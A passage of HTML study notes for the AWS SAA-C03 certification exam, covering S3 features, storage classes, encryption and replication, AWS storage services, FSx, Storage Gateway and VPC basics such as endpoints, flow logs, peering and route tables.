<li>Files larger than 5GB must be uploaded using multi-part upload. It‚Äôs recommended to use multi-part upload for files larger than 100MB</li>
</ul>
</li>
</ul>
</li>
<li>Baseline Performance
<ul>
<li>3500 PUT/COPY/POST/DELETE or 5500 GET/HEAD requests per seconds per prefix in a bucket</li>
<li>There are no limits to the number of prefixes in a bucket</li>
<li>Example of a prefix
<ul>
<li>bucket/folder1/subfolder1/mypic.jpg =&gt; prefix is /folder1/subfolder1/</li>
</ul>
</li>
</ul>
</li>
<li>S3 Select
<ul>
<li>Use SQL like language to only retrieve the data you need from S3 using server-side filtering</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th><strong>S3 Object</strong></th><th><strong>S3 Bucket</strong></th></tr>
</thead>
<tbody>
<tr><td>- Obejcts contain data(files)</td><td>- Buckets hold objects</td></tr>
<tr><td>- They are like files</td><td>- Buckets can have folders which can turn in hold objects</td></tr>
<tr><td>Object may consists of:  - <b> Key </b> this is the name of the object  - <b> Value </b> data itself is made up of sequence of bytes <br>- <b> Version Id </b> version of object (when versioning is enabled) <br> - <b> Metadata </b> additional information attached to the object</td><td>- S3 is universal namespace so domain names must be <ins> Unique </ins> (like having a domain name)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="s3-storage-classes-1"><a class="header" href="#s3-storage-classes-1">S3 Storage Classes</a></h2>
<hr>
<ul>
<li>AWS offers a range of S3 Storage classes that<ins> trade Retrieval, Time, Accessability and Durability for Cheaper Storage </ins></li>
</ul>
<h3 id="descending-from-expensive-to-cheaper-1"><a class="header" href="#descending-from-expensive-to-cheaper-1">(Descending from expensive to cheaper)</a></h3>
<div style="display:flex;">
<img src="clouds/aws/saa-c03/images/S3/cheaper.png" width="15%" height="500" float="right" />
<p float="right">
<ul>
<li>
<p><b> S3 Standard (default) </b></p>
<ul>
<li>Fast! 99.99 % Availability,</li>
<li>11 9‚Äôs Durability. If you store 10,000,000 objects on S3, you can expect to lose a single object once every 10,000 years</li>
<li>Replicated across at least three AZs
<ul>
<li>S3 standard can sustain 2 concurrent facility failures</li>
</ul>
</li>
</ul>
</li>
<li>
<p><b> S3 Intelligent Tiering </b></p>
<ul>
<li>Uses ML to analyze object usage and determine the appropriate storage class</li>
<li>Data is moved to most cost-effective tier without any performance impact or added overhead</li>
</ul>
</li>
<li>
<p><b> S3 Standard-IA (Infrequent Access) </b></p>
<ul>
<li>Still Fast! Cheaper if you access files less than once a month</li>
<li><ins> Additional retrieval fee is applied</ins>. 50% less than standard (reduced availability)</li>
<li>99.9% Availability</li>
</ul>
</li>
<li>
<p><b> S3 One-Zone-IA </b></p>
<ul>
<li>Still fast! Objects only exist in one AZ.</li>
<li>Availability (is 99.5%). but cheaper than Standard IA by 20% less</li>
<li>reduces durability</li>
<li>Data could be destroyed</li>
<li>Retrieval fee is applied</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Instant Retrieval</b></p>
<ul>
<li>Millisecond retrieval, great for data accessed once a quarter</li>
<li>Minimum storage duration of 90 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Flexible Retrieval</b></p>
<ul>
<li>data retrieval: Expedited (1 to 5 minutes), Standard (3 to 5 hours), Bulk (5 to 12 hours) - free</li>
<li>minimum storage duration is 90 days</li>
<li>Retrieval of data can take minutes to hours but the off is <ins> very cheap storage </ins></li>
</ul>
</li>
<li>
<p><b> S3 Glacier Deep Archive</b></p>
<ul>
<li>The lowest cost storage class - Data retrieval time is 12 hours</li>
<li>standard (12 hours), bulk (48 hours)</li>
<li>Minimum storage duration is 180 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Intelligent Tiering</b></p>
</li>
</ul>
</p>

</div>

<hr>
<h2 id="storage-class-comparison"><a class="header" href="#storage-class-comparison">Storage class comparison</a></h2>
<hr><img src="clouds/aws/saa-c03/images/S3/storage-class-comparison.jpg" width="70%" height="70%" />
<ul>
<li>S3 Guarantees:
<ul>
<li>Platform is built for 99.99% availability</li>
<li>Amazon guarantee 99.99% availability</li>
<li>Amazon guarantees 11‚Äô9s of durability</li>
</ul>
</li>
</ul>
<hr>
<h2 id="s3-security-1"><a class="header" href="#s3-security-1">S3 Security</a></h2>
<hr>
<ul>
<li>
<p>All new buckets are <b> PRIVATE</b> when created by default</p>
</li>
<li>
<p>Logging per request can be turned on a bucket</p>
</li>
<li>
<p>Log files are generated and saved in a different bucket (can be stored in a bucket from different AWS account if desired)</p>
</li>
<li>
<p>Access control is configured using <b> Bucket Policies </b> and <b> Access Control Lists (ACL) </b></p>
</li>
<li>
<p>User-Based Security</p>
<ul>
<li>IAM Policies</li>
<li>An IAM principal can access an s3 object if the user IAM permissions allow it OR the resource policy allows it and there is no explicit deny</li>
</ul>
</li>
<li>
<p>Resource-Based Security</p>
<ul>
<li>
<p>Bucket Policies - Bucket wide rules from the S3 console</p>
<ul>
<li>
<p>JSON based policy</p>
<pre><code>  {
      "Version": "2012-10-17",
      "Statement": [{
          "Sid": "AllowGetObject",
          "Principal": {
              "AWS": "*"
          },
          "Effect": "Allow",
          "Action": "s3:GetObject",
          "Resource": "arn:aws:s3:::DOC-EXAMPLE-BUCKET/*",
          "Condition": {
              "StringEquals": {
                  "aws:PrincipalOrgID": ["o-aa111bb222"]
              }
          }
      }]
  }
</code></pre>
</li>
<li>
<p>You can use the AWS Policy Generator to create JSON policies</p>
</li>
</ul>
</li>
<li>
<p>Object ACL - finer grained</p>
</li>
<li>
<p>Bucket ACL - Less common</p>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="s3-static-website-hosting-1"><a class="header" href="#s3-static-website-hosting-1">S3 Static Website Hosting</a></h2>
<ul>
<li>You must enable public reads on the bucket</li>
</ul>
<h2 id="s3-encryption-1"><a class="header" href="#s3-encryption-1">S3 Encryption</a></h2>
<ul>
<li>
<p>4 types of encryption in S3</p>
<ul>
<li>
<p>Server side encryption with managed keys (SSE-S3)</p>
<ul>
<li>Key is completely managed by AWS, you never see it</li>
<li>Object is encrypted server-side</li>
<li>Enabled by default
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AES256"</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>Server side encryption with KMS keys stored in AWS KMS (SSE-KMS)</p>
<ul>
<li>Manage the key yourself, store the key in KMS</li>
<li>You can audit the key use in CloudTrail
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AWS:KMS"</code></li>
</ul>
</li>
<li>Accessing the key counts toward your KMS Requests quota (5500, 10000, 30000 rps, based on region)
<ul>
<li>You can request a quota increase from AWS</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Server Side Encryption with customer provided keys (SSE-C)</p>
<ul>
<li>Can only be enabled/disabled from the AWS CLI</li>
<li>AWS doesn‚Äôt store the encryption key you provide</li>
<li>The ky must be passed as part of the headers with every request you make</li>
<li>HTTPS must be used</li>
</ul>
</li>
<li>
<p>CSE (Client side encryption)</p>
<ul>
<li>Clients encrypt/decrypt all the data before sending any data to S3</li>
<li>Customer fully managed the keys and encryption lifecycle</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Encryption in Transit</p>
<ul>
<li>Traffic between local host and S3 is achieved via <b> SSL/TLS</b></li>
</ul>
</li>
</ul>
<h2 id="s3-objects"><a class="header" href="#s3-objects">S3 Objects</a></h2>
<img src="clouds/aws/saa-c03/images/S3/s3-objects.jpg" width="50%" />
<h2 id="s3-data-consistency"><a class="header" href="#s3-data-consistency">S3 Data Consistency</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>New Object (PUTS)</th><th>Overwrite (PUTS) or Delete Objects (DELETES)</th></tr>
</thead>
<tbody>
<tr><td>Read After Write Consistency</td><td>Eventual Consistency</td></tr>
<tr><td>When you upload a new S3 Object you are able to read immediately after writing</td><td>When you overwrite or delete an object it takes time for S3 to replicate versions to AZs</td></tr>
<tr><td></td><td>If you were to read immediately, S3 may return you an old copy. You need to generally wait a few seconds before reading</td></tr>
</tbody>
</table>
</div>
<h2 id="s3-cross-region-replication-or-same-region-replication-1"><a class="header" href="#s3-cross-region-replication-or-same-region-replication-1">S3 Cross-Region Replication or Same-Region Replication</a></h2>
<ul>
<li>
<p>When enabled, any object that is uploaded will be <b> Automatically replicate </b> to another region or from source to destination buckets</p>
  <img src="clouds/aws/saa-c03/images/S3/cross-region-replication.jpg" width="40%" height="70%" />
</li>
<li>
<p>Must have versioning turned on both the source and destination buckets.</p>
</li>
<li>
<p>Can have CRR replicate to another AWS account</p>
</li>
<li>
<p>Replicate objects within the same region</p>
</li>
<li>
<p>You must give proper IAM permissions to S3</p>
</li>
<li>
<p>Buckets can be in different AWS accounts</p>
</li>
<li>
<p>Only new objects are replicated after enabling replication. To replicate existing objects, you must use S3 Batch Replication</p>
</li>
<li>
<p>For DELETE operations, you can optionally replicate delete markers. Delete Markers are not replicated by default.</p>
</li>
<li>
<p>To replicate, you create a replication rule in the ‚ÄúManagement‚Äù tab of the S3 bucket. You can choose to replicate all objects in the bucket, or create a rule scope</p>
</li>
</ul>
<h2 id="s3-versioning-1"><a class="header" href="#s3-versioning-1">S3 Versioning</a></h2>
<ul>
<li>
<p>allows to version the object</p>
</li>
<li>
<p>Stores all versions of an object in S3</p>
</li>
<li>
<div style="display:flex;"> Once enabled it cannot be disabled, only suspended on the bucket
<p><img src="clouds/aws/saa-c03/images/S3/versioning-enable-feature.jpg" width="30%" height="70%" float="right" /> </p>
</div>
</li>
<li>
<p>Fully integrates with S3 Lifecycle rules</p>
</li>
<li>
<p>MFA Delete feature provides extra protection against deletion of your data</p>
  <img src="clouds/aws/saa-c03/images/S3/versioning.jpg" width="50%" />
</li>
</ul>
<h2 id="lifecycle-management"><a class="header" href="#lifecycle-management">Lifecycle Management</a></h2>
<ul>
<li>
<p>Lifecycle Rule Actions</p>
<ul>
<li>Move current objects between storage classes</li>
<li>Move noncurrent versions of objects between storage classes</li>
<li>Expire current versions of objects</li>
<li>Permanently delete noncurrent versions of objects</li>
<li>Delete Expired object delete markers or incomplete multi-part uploads</li>
</ul>
</li>
<li>
<p>Automates the process of moving objects to different Storage classes or deleting objects all together</p>
</li>
<li>
<p>Can be used together with <b> Versioning </b></p>
</li>
<li>
<p>Can be applied to both <b> Current </b> and <b> previous </b> versions</p>
  <img src="clouds/aws/saa-c03/images/S3/s3-lifecycle-management.jpg " width="50%" />
</li>
</ul>
<h2 id="s3-transfer-acceleration"><a class="header" href="#s3-transfer-acceleration">S3 Transfer Acceleration</a></h2>
<ul>
<li>
<p>Fast and secure transfer of files<b> over long distances </b> between your end users and an S3 bucket</p>
</li>
<li>
<p>Utilizes <b> <ins> CloudFront‚Äôs </ins></b> distributed <b><ins> Edge locations </ins></b></p>
</li>
<li>
<p>Instead of uploading to your bucket, users use a <i><ins> distinct URL </ins></i> for an Edge location</p>
</li>
<li>
<p>As data arrives at the Edge location it is automatically routed to S3 over a specially optimized network path. (Amazon‚Äôs backbone network)</p>
</li>
<li>
<p>Transfer acceleration is fully compatible with multi-part upload</p>
  <img src="clouds/aws/saa-c03/images/S3/transfer-acceleration.jpg" width="50%" />
</li>
</ul>
<h2 id="presigned-urls-1"><a class="header" href="#presigned-urls-1">Presigned URLs</a></h2>
<ul>
<li>
<p>Generates a URL which provides temporary access to an object to either upload or download object data.</p>
</li>
<li>
<p>The pre-signed URL inherites the permission of the user that created the pre-signed URL</p>
</li>
<li>
<p>Presigned Urls are commonly used to <ins> provide access to <b> private objects </b></ins></p>
</li>
<li>
<p>Can use AWS CLI or AWS SDK to generate Presigned Urls</p>
  <img src="clouds/aws/saa-c03/images/S3/presigned-urls.jpg" width="50%" height="30%" />
</li>
<li>
<p>If in case a web-application which need to allow users to download files from a password protected part of the web-app. Then the web-app generates presigned url which expires after 5 seconds. The user downloads the file.</p>
</li>
</ul>
<h2 id="mfa-delete-1"><a class="header" href="#mfa-delete-1">MFA Delete</a></h2>
<ul>
<li>
<p><b> MFA Delete</b> ensures users cannot delete objects from a bucket unless they provide their MFA code.</p>
  <img src="clouds/aws/saa-c03/images/S3/mfa-delete.jpg" width="50%" height="30%" />
</li>
<li>
<p>MFA delete can only be enabled under these conditions</p>
<ol>
<li>The AWS CLI must be used to turn on MFA</li>
<li>The bucket must have versioning turned on</li>
</ol>
  <img src="clouds/aws/saa-c03/images/S3/mfa-delete-log.jpg" width="50%" height="30%" />
</li>
<li>
<p>Only the bucket owner logged in as <ins><b> Root User</b></ins> can <b> DELETE</b> objects from bucket</p>
</li>
</ul>
<h2 id="aws-snow-family"><a class="header" href="#aws-snow-family">AWS Snow Family</a></h2>
<ul>
<li>AWS Snow Family are <ins> Storage and compute devices used to physically move data in or out the cloud </ins> when moving data over the internet or private connection it to slow, difficult or costly</li>
<li>Data Migration: Snowcone, Snowball Edge (Storage Optimized), Snowmobile</li>
<li>Edge computing: Snowcone, Snowball Edge (Compute Optimized)</li>
<li>Snowcone
<ul>
<li>Small, weighs 4 pounds</li>
<li>Rugged</li>
<li>Must provide your own battery and cables</li>
<li>Snowcone 8TB</li>
<li>Snowcone 14TB SSD</li>
</ul>
</li>
</ul>
<p><img src="clouds/aws/saa-c03/images/S3/snow_family.png" alt="Snow family"></p>
<h2 id="storage-services"><a class="header" href="#storage-services">Storage Services</a></h2>
<ul>
<li>
<p><b> Simple Storage Service (S3)</b></p>
<ul>
<li>A <ins> serverless object storage service </ins> is created</li>
<li>can upload very large files and unlimited amount of files</li>
<li>you pay for what you store</li>
<li>Need not worry about the underlying file-system or upgrading the disk size</li>
</ul>
</li>
<li>
<p><b> S3 Glacier </b></p>
<ul>
<li>Cold storage service</li>
<li><ins> low cost storage solution </ins> for <i> archiving and long-term backup </i></li>
<li>Uses previous generation HDD drives to get that low cost</li>
<li>highly secure and durable</li>
</ul>
</li>
<li>
<p><b> Elastic Block Store (EBS) </b></p>
<ul>
<li><ins> a persistent block storage service </ins></li>
<li>virtual hard drive in the cloud to attach to EC2 instances</li>
<li>can choose different kinds of storage: SSD, IOPS, SSD, Throughput HHD, Cold HHD</li>
</ul>
</li>
<li>
<p><b> Elastic File Storage (EFS) </b></p>
<ul>
<li><ins> a cloud-native NFS file system service </ins></li>
<li>File storage you can mount to <ins> multiple Ec2 instances at the same time</ins></li>
<li>When you need to share files between multiple EC2 instances</li>
</ul>
</li>
<li>
<p><b> Storage Gateway </b></p>
<ul>
<li><ins> a hybrid cloud storage </ins> service that extends your on-premise storage to cloud
<ul>
<li><b> File Gateway </b> : extends your local storage to AWS S3</li>
<li><b> Volume Gateway </b> : caches your local drives to S3 so you have continuous backup of files on cloud</li>
<li><b> Tape Gateway </b> : stores files on virtual tapes for very cost effective and long term storage</li>
</ul>
</li>
</ul>
</li>
<li>
<p><b> AWS Snow Family </b></p>
<ul>
<li>Storage devices used to physically migrate large amounts of data</li>
<li><b> Snowball and Snowball Edge </b> {Snowball does not exist anymore} briefcase size of data storage devices. 50-80 Terabytes</li>
<li><b> Snowmobile </b> Cargo container filled with racks of storage and compute that is transported via semi-trailer tractor truck to transfer upto 100PB of data per trailer</li>
<li><b> Snowcone </b> very small version of snowball that can transfer 8TB of data</li>
</ul>
</li>
<li>
<p><b> AWS Backup </b></p>
<ul>
<li>a <ins> fully managed backup service </ins></li>
<li>centralize and automate the backup of the backup data across multiple AWS services</li>
<li>eg. EC2, EBS, RDS, DynamoDB, EFS, Storage Gateway</li>
<li>can create backup plans</li>
</ul>
</li>
<li>
<p><b> Cloud Endure Disaster Recovery </b></p>
<ul>
<li>Continuously replicates your machines into low cost staging area in your target AWS account and preferred region enabling fast and reliable recovery if one of the data center fails</li>
</ul>
</li>
<li>
<p><b> Amazon FSx </b></p>
</li>
<li>
<p>Launch 3rd party high performance file systems on AWS</p>
</li>
<li>
<p>Fully managed service</p>
</li>
<li>
<p>Supports Lustre, OpenZFS, NetApp ONTAP, and Windows File Server (SMB)</p>
</li>
<li>
<p>Data is backed up daily</p>
</li>
<li>
<p><b>Windows FSx can be mounted on Linux Servers</b></p>
</li>
<li>
<p>Lustre is derived from Linux and Cluster and used for high-performance computing</p>
</li>
<li>
<p>FSx can be used for on-prem servers using Direct Connect or VPN</p>
</li>
<li>
<p>FSx for Lustre deployment options:</p>
<ul>
<li>Scratch file system
<ul>
<li>Temporary storage, data is not replicated, high performance</li>
</ul>
</li>
<li>Persistent File System
<ul>
<li>Long term storage, data is replicated within same AZ (files replaced within minutes upon failure)</li>
</ul>
</li>
</ul>
</li>
<li>
<p>FSx for NetApp ONTAP is compatible with NFS, SMB, iSCSI. Supports point-in-time instantaneous cloning</p>
</li>
<li>
<p><b> Amazon Athena </b></p>
<ul>
<li>A serverless, interactive analytics service built on open-source frameworks, <ins> <b>supporting open-table and file formats.</b></ins></li>
<li>Athena provides simplified flexible way to analyze petabytes of data where it lives</li>
<li>Analyze data or build applications from an S3 data lake and 30 data sources, including on-premises data sources or other cloud systems using SQL or Python</li>
</ul>
</li>
</ul>
<h2 id="storage-gateway-1"><a class="header" href="#storage-gateway-1">Storage Gateway</a></h2>
<ul>
<li>
<p>Bridge between on-prem and S3 storage</p>
</li>
<li>
<p>Can run as a virtual or hardware appliance on-prem</p>
</li>
<li>
<p>Use Cases:</p>
<ol>
<li>disaster recovery</li>
<li>backup and restore/cloud migration</li>
<li>tiered storage</li>
<li>on-premises cache and low-latency file access</li>
</ol>
</li>
<li>
<p>S3 File Gateway</p>
<ul>
<li>S3 buckets are accessible using the NFS and SMB protocol</li>
<li>Most recently used data is cached in the file gateway</li>
<li>Supports S3 standard, S3 Standard IA, S3 One ZOne A, S3 Intelligent Tiering</li>
<li>Transition to S3 Glacier using a Lifecycle Policy</li>
</ul>
</li>
<li>
<p>FSx File Gateway</p>
<ul>
<li>Native access to Amazon FSx for Windows File Server</li>
<li>Useful for caching frequently accessed data on your local network</li>
<li>Windows native compatibility</li>
</ul>
</li>
<li>
<p>Volume Gateway</p>
<ul>
<li>Block storage using iSCSI backed by S3</li>
<li>Point in time backups</li>
<li>Gives you the ability to restore on-prem volumes</li>
</ul>
</li>
<li>
<p>Tape Gateway</p>
<ul>
<li>Same as Volume Gateway, but for tapes</li>
</ul>
</li>
</ul>
<h2 id="amazon-fsx-vs-efs"><a class="header" href="#amazon-fsx-vs-efs">Amazon Fsx vs EFS</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>EFS</th><th>FSx</th></tr>
</thead>
<tbody>
<tr><td>EFS is a managed NAS filer for EC2 instances based on Network File System (NFS) version 4</td><td>FSx is a managed Windows Server that runs Windows Server Message Block (SMB) based files systems</td></tr>
<tr><td>File systems are distributed across availability zones (AZs) to eliminate I/O bottlenecks and improve data durability</td><td>Built for high performance and sub-millisecond latency using solid-state drive storage volumes</td></tr>
<tr><td>Better for Linux Systems</td><td>Applications:  - Web servers and content management systems built on windows and deeply integrated with windows server ecosystem</td></tr>
</tbody>
</table>
</div>
<h2 id="s3-object-lock"><a class="header" href="#s3-object-lock">S3 Object Lock</a></h2>
<ul>
<li>
<p>With S3 Object Lock, you can store objects using <ins> <b> write-once-read-many (WORM) </b> mode.</ins></p>
</li>
<li>
<p>Object lock can <ins> prevent from objects from being deleted or overwritten </ins> for a <i> fixed amount of time or indefinitely </i></p>
<h3 id="governance-mode"><a class="header" href="#governance-mode">Governance mode</a></h3>
<ul>
<li>Users can‚Äôt overwrite or delete an object version or alter its lock settings unless they have special permissions.</li>
<li>Protect objects against being deleted by most users, but you can still grant some users permission to alter the retention settings or delete the object if necessary.</li>
<li>Used to test retention-period settings before creating a compliance- mode retention period</li>
</ul>
<h3 id="compliance-mode"><a class="header" href="#compliance-mode">Compliance mode</a></h3>
<hr>
<ul>
<li>A protected object version can‚Äôt be overwritten or deleted by any user, including the root user</li>
<li>When an object is locked in compliance mode, its retention mode can‚Äôt be changed, and tis retention period can‚Äôt be shortened.</li>
<li>Compliance mode helps ensure that an object version can‚Äôt be overwritten or deleted for the duration of the retention period</li>
</ul>
</li>
</ul>
<h2 id="s3-event-notifications-1"><a class="header" href="#s3-event-notifications-1">S3 Event Notifications</a></h2>
<ul>
<li>Automatically react to events within S3</li>
<li>Send events to SNS, SQS, Lambda, or Event Bridge. Event Bridge can then send the notification to many other AWS services
<ul>
<li>S3 requires permissions to these resources</li>
</ul>
</li>
<li>Use case: generate thumbnails of images</li>
</ul>
<h2 id="s3-access-point"><a class="header" href="#s3-access-point">S3 Access Point</a></h2>
<ul>
<li>Simplify security management for S3 buckets</li>
<li>Each access point has its own DNS name and access point policy (similar to a bucket policy)</li>
</ul>
<h2 id="aws-transfer-family"><a class="header" href="#aws-transfer-family">AWS Transfer Family</a></h2>
<ul>
<li>Use FTP, FTPS, or sFTP to transfer files to AWS</li>
<li>Pay per provisioned endpoint per hour + data transfer in GB</li>
<li>Integrate with existing Authentication system</li>
<li>Usage: Sharing files, public datasets, etc.</li>
</ul>
<h2 id="aws-datasync"><a class="header" href="#aws-datasync">AWS DataSync</a></h2>
<ul>
<li>Move large amount of data to and from on-prem or other cloud locations into AWS
<ul>
<li>Use NFS, SMB, HDFS, etc. Needs an agent installed.</li>
</ul>
</li>
<li>Move AWS service to another AWS service, no agent required.</li>
<li>Replication tasks are scheduled (synced)</li>
<li><b>Preserve file permissions and metadata</b> Remember this for the exam!!</li>
<li>One agent can use up to 10 Gbps. However, you can setup limits.</li>
</ul>
<h2 id="storage-comparison"><a class="header" href="#storage-comparison">Storage Comparison</a></h2>
<p>‚Ä¢ S3: Object Storage
‚Ä¢ S3 Glacier: Object Archival
‚Ä¢ EBS volumes: Network storage for one EC2 instance at a time
‚Ä¢ Instance Storage: Physical storage for your EC2 instance (high IOPS)
‚Ä¢ EFS: Network File System for Linux instances, POSIX filesystem
‚Ä¢ FSx for Windows: Network File System for Windows servers
‚Ä¢ FSx for Lustre: High Performance Computing Linux file system
‚Ä¢ FSx for NetApp ONTAP: High OS Compatibility
‚Ä¢ FSx for OpenZFS: Managed ZFS file system
‚Ä¢ Storage Gateway: S3 &amp; FSx File Gateway, Volume Gateway (cache &amp; stored), Tape Gateway
‚Ä¢ Transfer Family: FTP, FTPS, SFTP interface on top of Amazon $3 or Amazon EFS
‚Ä¢ DataSync: Schedule data sync from on-premises to AWS, or AWS to AWS
‚Ä¢ Snowcone / Snowball / Snowmobile: to move large amount of data to the cloud, physically
‚Ä¢ Database: for specific workloads, usually with indexing and querying</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpc-endpoint-cheatsheet"><a href="#vpc-endpoint-cheatsheet" class="header">Vpc-endpoint-cheatsheet</a></h1>
<ul>
<li>VPC Endpoints help keep traffic between AWS services within the AWS Network</li>
<li>There are two types of VPC Endpoints
<ul>
<li>Interface Endpoints</li>
<li>Gateway Endpoints</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Interface Endpoints</th><th>Gateway Endpoints</th></tr>
</thead>
<tbody>
<tr><td><b> Cost money </b></td><td><b> free </b></td></tr>
<tr><td>Uses as <b> Elastic Network Interface (ENI) </b> with private IP (powered by AWS PrivateLink)</td><td>a target for a specific route in the route table</td></tr>
<tr><td>support many AWS services</td><td>only supports S3 and DynamoDB</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpc-flow-logs-cheatsheet"><a href="#vpc-flow-logs-cheatsheet" class="header">Vpc-flow-logs-cheatsheet</a></h1>
<ul>
<li><b> VPC Flow Logs </b> monitor the in-and-out traffic of your network INterfaces within your PC</li>
<li>You can turn on FLow logs at the VPC, Subnet or Network Interface level</li>
<li>VPC FLow logs <b> cannot be tagged </b> like other AWS resources</li>
<li>You <b> cannot change the configuration </b> of a flow log after it‚Äôs created</li>
<li>You <b> cannot enable </b> flow logs for VPCs which are peered with your VPC <b> unless it is in the same account </b></li>
<li>VPC FLow logs can be delivered to an <b>S3 or CLoudWatch Logs </b></li>
<li>VPC Flow logs <ins> contains the source and destination IP addresses </ins>(not hostnames)</li>
<li>Some instance traffic is <b> <ins> not monitored </ins> </b>:
<ul>
<li>Instance traffic generated by contacting the AWS DNS servers</li>
<li>Windows license activation traffic from instances</li>
<li>Traffic to and from the instance metadta address (169.254.169.254)</li>
<li>DHCP Traffic</li>
<li>Any Traffic to the reserved IP address of the default VPC router</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="introduction-to-vpc-1"><a href="#introduction-to-vpc-1" class="header">Introduction to VPC</a></h1>
<ul>
<li><a href="#introduction-to-vpc">Introduction to VPC</a></li>
<li><a href="#core-components">Core Components</a></li>
<li><a href="#key-features">Key Features</a></li>
<li><a href="#default-vpc">Deafult VPC</a></li>
<li><a href="#vpc-peering-1">VPC Peering</a></li>
<li><a href="#route-tables">Route Tables</a></li>
<li><a href="#internet-gateway-igw">Internet Gateway (IGW)</a></li>
<li><a href="#bastionjumpbox">Bastion/Jumpbox</a></li>
<li><a href="#direct-connect-1">Direct Connect</a></li>
<li><a href="#vpc-endpoints-1">VPC Endpoints</a>
<ul>
<li><a href="#interface-endpoints">Interface Endpoints</a></li>
<li><a href="#vpc-gateway-endpoints">VPC Gateway Endpoints</a></li>
</ul>
</li>
<li><a href="#vpc-flow-logs-1">VPC Flow Logs</a></li>
<li><a href="#nacls">NACLs</a></li>
<li><a href="#security-groups-3">Security Groups</a></li>
<li><a href="#nacl-vs-security-groups">NACL v/s Security Groups</a></li>
<li><a href="#site-to-site-vpn--virtual-private-gateway-and-customer-gateway">Site to Site VPN , Virtual Private Gateway and Customer Gateway</a></li>
<li><a href="#secrets-manager-1">Secrets Manager</a></li>
</ul>
<hr>
<h2 id="introduction-to-vpc"><a class="header" href="#introduction-to-vpc">Introduction to VPC</a></h2>
<hr>
<ul>
<li>Think of a AWS VPC as your own personal data centre</li>
<li>Gives you complete control over your virtual networking environment.</li>
</ul>
<hr>
<h2 id="core-components"><a class="header" href="#core-components">Core Components</a></h2>
<hr>
<ul>
<li>Internet Gateway (IGW)</li>
<li>Virtual Private Gateway (VPN Gateway)</li>
<li>Routing Tables</li>
<li>Network Access Control Lists (NACLs) - Stateless</li>
<li>Security Groups (SG) Stateful</li>
<li>Public Subnets</li>
<li>Private Subnets</li>
<li>Nat Gateway</li>
<li>Customer Gateway</li>
<li>VPC Endpoints</li>
<li>VPC Peering</li>
</ul>
<hr>
<h2 id="key-features"><a class="header" href="#key-features">Key Features</a></h2>
<hr>
<ul>
<li>VPCs are Region Specific they do not span regions</li>
<li>You can create 5 VPC per region</li>
<li>Every region comes with a default VPC</li>
<li>You can have 200 subnets per VPC</li>
<li>You can use IPv4 Cidr Blocks (the address of the VPC)</li>
<li>Cost nothing: VPC‚Äôs, Route Tables, Nacls, Internet Gateways, Security Groups and Subnets, VPC Peering</li>
<li>Some things cost money: eg. NAT Gateway, VPC Endpoints, VPN Gateway, Cutomer Gateway</li>
<li>DNS hostnames (should your instance have domain)</li>
</ul>
<hr>
<h2 id="default-vpc"><a class="header" href="#default-vpc">Default VPC</a></h2>
<hr>
<ul>
<li>Craete a VPC with a szie/16 IPv4 CIDR block (172.31.0.0./16)</li>
<li>Create a size /20 default subnet in each AZ</li>
<li>Create an Internet Gateway and connect it to your default VPC</li>
<li>Create a default security  group and associate it with your default VPC</li>
<li>Create a default network access control list (NACL) and associate it with your default VPC</li>
<li>Associate the default DHCP options set for your AWS account with your default VPC</li>
<li>when you create a VPC, it automatically has a main route table</li>
</ul>
<hr>
<h2 id="vpc-peering-1"><a class="header" href="#vpc-peering-1">VPC Peering</a></h2>
<hr>
<ul>
<li>
<p>VPC  Peering allows to connect one VPC with another over a direct network route using private IP addresses</p>
</li>
<li>
<p>Instances on peered VPCs <b> behave </b> just like they are on the <b>same network</b></p>
</li>
<li>
<p>Connect VPCs across <b>same</b> or <b> different AWS accounts </b> and <b> regions </b></p>
</li>
<li>
<p>Peering uses a <ins> <b> Star Configuration: 1 Central VPC - 4 other VPCs</b></ins></p>
</li>
<li>
<p><b> No Transitive Peering </b> (peering must take place directly between VPCs)</p>
<ul>
<li>Needs a one to one connect to immediate VPC</li>
</ul>
</li>
<li>
<p><b> No Overlapping CIDR Blocks </b></p>
  <img src="clouds/aws/saa-c03/images/VPC/vpc-peering.jpg" width="40%" height="70%" />
</li>
</ul>
<hr>
<h2 id="route-tables"><a class="header" href="#route-tables">Route Tables</a></h2>
<hr>
<ul>
<li>
<p>Route Tables are used to determine where network traffic is directed</p>
</li>
<li>
<p>Each subnet in your VPC must be associated with a route table</p>
</li>
<li>
<p>A subnet can only be associated with one route table at a time, but you can associate multiple subnets with the same route table</p>
  <img src="clouds/aws/saa-c03/images/VPC/route-table.jpg" width="40%" height="70%" />
</li>
</ul>
<hr>
<h2 id="internet-gateway-igw"><a class="header" href="#internet-gateway-igw">Internet Gateway (IGW)</a></h2>
<hr>
<ul>
<li>
<p>The Internet Gateway allows your VPC access to the Internet</p>
</li>
<li>
<p>IGW does two things:</p>
<ol>
<li>Provide a target in your VPC route tables for internet-routable traffic</li>
<li>Perform network address translation (NAT) for instances that have been assigned public IPv4 addresses</li>
</ol>
</li>
<li>
<p>To route out to the internet you need to add in your route tables you need to add a route</p>
</li>
<li>
<p>To the internet gateway and set the Destination to be 0.0.0.0/0</p>
  <img src="clouds/aws/saa-c03/images/VPC/internet-gateway.jpg" width="60%" height="70%" />
</li>
</ul>
<hr>
<h2 id="bastionjumpbox"><a class="header" href="#bastionjumpbox">Bastion/Jumpbox</a></h2>
<hr>
<ul>
<li>
<p>Bastions are EC2 instances which are security harden.</p>
</li>
<li>
<p>They are designed to help you gain access to your EC2 instances via SSH or RCP that are in a <b> <ins> private subnet</ins> </b></p>
</li>
<li>
<p>They are also known as Jump boxes because you are jumping from one box to access another.</p>
</li>
<li>
